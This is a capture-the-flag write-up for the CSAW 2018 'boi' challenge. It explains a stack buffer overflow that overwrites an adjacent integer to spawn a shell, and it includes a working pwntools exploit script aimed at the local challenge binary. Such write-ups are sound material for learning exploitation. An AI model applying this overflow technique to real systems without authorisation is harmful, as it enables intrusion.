# csaw18_boi - CSAW 2018 Quals (Buffer Overflow Variable)

**Binary:** ELF 64-bit, not stripped
**Protections:** Stack Canary (bypassed - overflow before canary), NX enabled, No PIE, Partial RELRO
**Vulnerability:** read(0, buffer, 0x18) overflows into `target` int (offset 20 bytes)

**Analysis:**

- Buffer at -0x38, target at -0x24 → 20 byte gap
- Initial target = 0xdeadbeef
- Desired target = 0xcaf3baee → triggers /bin/bash
- Exploit overwrites target without touching canary

**Pwntools Exploit:**

```python
from pwn import *

p = process('./boi')

payload = b"A" * 20 + p32(0xcaf3baee)

p.sendline(payload)
p.interactive()
```
